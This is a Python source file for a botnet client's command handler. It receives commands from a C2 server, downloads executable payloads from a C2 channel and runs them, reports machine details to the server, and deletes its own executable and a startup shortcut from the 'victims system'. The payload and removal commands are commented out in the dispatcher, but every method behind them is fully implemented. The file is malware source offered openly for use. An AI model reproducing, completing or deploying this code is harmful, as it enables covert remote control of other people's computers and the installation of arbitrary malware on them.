# Import Libraries
import os
import sys
import requests
import subprocess

# Import Classes
from bots.Command import Command
from bots.CommandConverter import CommandConverter

from bots.MachineInfo import MachineInfo
from bots.ExecutingProgramHandler import ExecutingProgramHandler
from bots.NotificationBuilder import NotificationBuilder

# Import Dictionaries
from bots.dictionaries.NotficationEvents import Events
from bots.dictionaries.CommunicationChannels import CommChannels


# Handles the recieved commands from the C2 server and executes the corresponding actions on the bot's system
class CommandHandler:
    def __init__(self, bot, crypt):
        self.bot = bot
        self.crypt = crypt

        self.machineInfo = MachineInfo()
        self.exeHandler = ExecutingProgramHandler()
        self.notificationBuilder = NotificationBuilder(self.crypt)
        self.cmdConverter = CommandConverter()


    # Download the payload from a specified URL and save it to the bot's system
    def __download_payload(self, id: str):
        payloadURL = CommChannels["DOWNLOAD_CHANNEL"] + f"/{id}.exe"
        outputFile = f"payloads/{id}.exe"

        # Ensure the payloads directory exists
        os.makedirs("payloads", exist_ok=True)
        print(f"Downloading payload... from URL: {payloadURL}")

        r = requests.get(payloadURL)
        if r.status_code == 200:
            with open(outputFile, "wb") as f:
                f.write(r.content)
            print("File downloaded successfully")
        else:
            print("Failed to download file:", r.status_code)


    # Execute the payload on the bot's system, handle any errors that may occur during execution
    def __executePayload(self, id: str):
        print("Executing Payload...")
        payload_name = f"payloads/{id}.exe"
        self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
        print("Payload executed successfully.")


    # Stop any running payloads
    def __stopPayload(self):
        self.exeHandler.stop_all_programs()


    # Announce bot status to C2 server
    def __announce_status(self):
        print("Announcing status to C2 server...")

        mInfo = self.machineInfo.get_machine_info()
        ntfy = self.notificationBuilder.build_notification(mInfo, Command.STATUS)

        r = requests.post(CommChannels["RESPONSE_CHANNEL"], data=ntfy.encode(encoding='utf-8'))
        if r.status_code == 200:
            print(f"Bot announced status successfully.")
        else:
            print(f"Bot failed to announce status.")


    # Remove all payload files from the bot's system
    def __cleanupPayloads(self):
        path = "./payloads"
        dir_list = os.listdir(path)

        for file in dir_list:
            os.remove(path + "/" + file)
        os.removedirs(path)


    # Delete bot executable from victims system
    def __schedule_self_delete(self):
        exe_path = os.path.abspath(sys.argv[0])
        if os.name == "nt":  # Windows
            subprocess.Popen(
                f'cmd /c ping 127.0.0.1 -n 5 > nul & del "{exe_path}"',
                shell=True
            )
        else:  # Linux / macOS
            subprocess.Popen(
                f'sh -c "sleep 5 && rm \\"{exe_path}\\""',
                shell=True
            )

        # Delete shortcut if exists
        shortcut_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
                                     'Start Menu', 'Programs', 'Startup', 'BotnetStartup.lnk')
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)

        # Stop bot
        self.bot.quit = True

    # Handle status request, if params is None or matches the bot's MAC address, announce status to C2 server
    def __handle_status_request(self, id, params):
        if params != None:
            MACADDR = params[0]

        if id == None:
            self.__announce_status()
        elif MACADDR == self.machineInfo.MAC_ADDR:
            self.__announce_status()
        else:
            pass

    # Handle commands received from C2 server
    def handle_command(self, cmd_tuple):
        cmd, id, params = cmd_tuple
        cmd = self.cmdConverter.convert_cmd_to_enum(cmd)

        print(f"Handling command: {cmd}, id: {id}, params: {params}")

        if cmd == Command.STATUS:
            self.__handle_status_request(id, params)
        # elif cmd == Command.PAYLOAD:
        #     self.__download_payload(id)
        # elif cmd == Command.EXECUTE:
        #     self.__executePayload(id)
        # elif cmd == Command.STOP:
        #     self.__stopPayload()
        # elif cmd == Command.REMOVE:
        #     self.__stopPayload()
        #     self.__cleanupPayloads()
        #     self.__schedule_self_delete()
        else:
            print ("Received unknown command, ignoring...")